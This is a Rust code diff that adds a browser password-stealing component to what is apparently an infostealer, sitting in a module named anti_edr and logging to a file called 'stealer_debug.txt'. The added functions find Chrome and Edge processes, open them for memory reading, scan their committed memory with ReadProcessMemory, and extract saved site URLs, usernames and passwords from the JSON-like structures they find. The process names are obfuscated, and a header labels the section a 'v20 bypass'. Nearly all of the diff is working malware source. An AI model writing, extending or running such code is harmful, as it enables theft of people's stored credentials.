@@ -565,6 +565,228 @@ pub mod anti_edr {
     }
 }
 
+// ═══════════════════════════════════════════════════════════
+// PASSWORD MEMORY SCANNING (v20 bypass)
+// ═══════════════════════════════════════════════════════════
+
+/// Estructura para almacenar password encontrado en memoria
+#[derive(Debug, Clone)]
+pub struct PasswordData {
+    pub url: String,
+    pub username: String,
+    pub password: String,
+}
+
+/// Escanea TODOS los procesos Chrome/Edge buscando passwords en memoria
+pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<PasswordData> {
+    use std::io::Write;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
+    let mut all_passwords = Vec::new();
+    let process_name = if browser_name.to_lowercase().contains("edge") {
+        obfstr!("msedge.exe").to_string()
+    } else if browser_name.to_lowercase().contains("chrome") {
+        obfstr!("chrome.exe").to_string()
+    } else {
+        return all_passwords;
+    };
+    
+    log(&format!("🔍 [PASSWORD SCAN] Buscando procesos {}...", process_name));
+    
+    let processes = find_processes_by_name(&process_name);
+    log(&format!("🔍 [PASSWORD SCAN] Encontrados {} procesos", processes.len()));
+    
+    for (idx, process) in processes.iter().enumerate() {
+        log(&format!("  📍 Escaneando proceso #{} - PID: {}", idx + 1, process.pid));
+        
+        let passwords = scan_memory_for_passwords_internal(process, &mut log);
+        
+        if !passwords.is_empty() {
+            log(&format!("    ✅ Encontrados {} passwords en PID {}", passwords.len(), process.pid));
+            all_passwords.extend(passwords);
+        }
+    }
+    
+    log(&format!("🎯 [PASSWORD SCAN] Total: {} passwords encontrados", all_passwords.len()));
+    
+    all_passwords
+}
+
+/// Encuentra procesos por nombre (genérico para Chrome/Edge/otros)
+fn find_processes_by_name(process_name: &str) -> Vec<EdgeProcess> {
+    let mut processes = Vec::new();
+    
+    unsafe {
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+            return processes;
+        }
+
+        let mut entry: PROCESSENTRY32 = mem::zeroed();
+        entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
+
+        if Process32First(snapshot, &mut entry) == FALSE {
+            CloseHandle(snapshot);
+            return processes;
+        }
+
+        loop {
+            let current_name = String::from_utf8_lossy(
+                &entry.szExeFile.iter()
+                    .take_while(|&&c| c != 0)
+                    .map(|&c| c as u8)
+                    .collect::<Vec<u8>>()
+            ).to_lowercase();
+
+            if current_name == process_name.to_lowercase() {
+                let pid = entry.th32ProcessID;
+                
+                let handle = OpenProcess(
+                    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+                    FALSE,
+                    pid
+                );
+
+                if !handle.is_null() {
+                    processes.push(EdgeProcess {
+                        pid,
+                        handle,
+                        base_address: 0,
+                    });
+                }
+            }
+
+            if Process32Next(snapshot, &mut entry) == FALSE {
+                break;
+            }
+        }
+
+        CloseHandle(snapshot);
+    }
+    
+    processes
+}
+
+/// Escanea memoria de UN proceso buscando passwords
+fn scan_memory_for_passwords_internal<F>(process: &EdgeProcess, log: &mut F) -> Vec<PasswordData>
+where
+    F: FnMut(&str),
+{
+    let mut passwords = Vec::new();
+    
+    unsafe {
+        const CHUNK_SIZE: usize = 8192;  // Más grande para passwords (URLs largas)
+        let mut address: usize = 0x10000;
+        let mut buffer = vec![0u8; CHUNK_SIZE];
+        let mut pages_scanned = 0;
+        
+        while address < 0x7FFF_0000 && pages_scanned < 5000 {
+            let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
+            let query_result = VirtualQueryEx(
+                process.handle,
+                mem::transmute(address),
+                &mut mbi as *mut MEMORY_BASIC_INFORMATION,
+                mem::size_of::<MEMORY_BASIC_INFORMATION>()
+            );
+            
+            if query_result == 0 {
+                address += 0x10000;
+                continue;
+            }
+            
+            let is_readable = (mbi.Protect & PAGE_READONLY != 0) 
+                || (mbi.Protect & PAGE_READWRITE != 0);
+            
+            if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
+                let region_start = address;
+                let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
+                let mut region_addr = region_start;
+                
+                while region_addr < region_end && pages_scanned < 5000 {
+                    let mut bytes_read: usize = 0;
+                    
+                    let result = ReadProcessMemory(
+                        process.handle,
+                        mem::transmute(region_addr),
+                        buffer.as_mut_ptr() as LPVOID,
+                        CHUNK_SIZE,
+                        &mut bytes_read as *mut usize
+                    );
+                    
+                    pages_scanned += 1;
+                    
+                    if result != 0 && bytes_read > 100 {
+                        // Buscar patrones de password en memoria
+                        if let Some(pwd) = search_password_pattern(&buffer[..bytes_read]) {
+                            passwords.push(pwd);
+                        }
+                    }
+                    
+                    region_addr += CHUNK_SIZE;
+                }
+            }
+            
+            address += mbi.RegionSize as usize;
+        }
+    }
+    
+    passwords
+}
+
+/// Busca patrones de password en memoria (heurística)
+fn search_password_pattern(data: &[u8]) -> Option<PasswordData> {
+    let text = String::from_utf8_lossy(data);
+    
+    // Buscar patrones: "https://" + texto + "username" + "password"
+    // Chromium almacena passwords en estructuras JSON en memoria
+    
+    // Patrón 1: JSON con origin_url, username_value, password_value
+    if text.contains("origin_url") && text.contains("password_value") {
+        // Extraer URL
+        let url = extract_between(&text, "origin_url\":\"", "\"")?;
+        
+        // Extraer username
+        let username = extract_between(&text, "username_value\":\"", "\"")?;
+        
+        // Extraer password
+        let password = extract_between(&text, "password_value\":\"", "\"")?;
+        
+        // Validar que no estén vacíos
+        if !url.is_empty() && !username.is_empty() && !password.is_empty() {
+            return Some(PasswordData {
+                url: url.to_string(),
+                username: username.to_string(),
+                password: password.to_string(),
+            });
+        }
+    }
+    
+    // Patrón 2: Estructuras internas de Chromium (más complejo)
+    // TODO: Implementar si patrón 1 no funciona
+    
+    None
+}
+
+/// Extrae substring entre dos delimitadores
+fn extract_between<'a>(text: &'a str, start: &str, end: &str) -> Option<&'a str> {
+    let start_idx = text.find(start)? + start.len();
+    let remaining = &text[start_idx..];
+    let end_idx = remaining.find(end)?;
+    Some(&remaining[..end_idx])
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
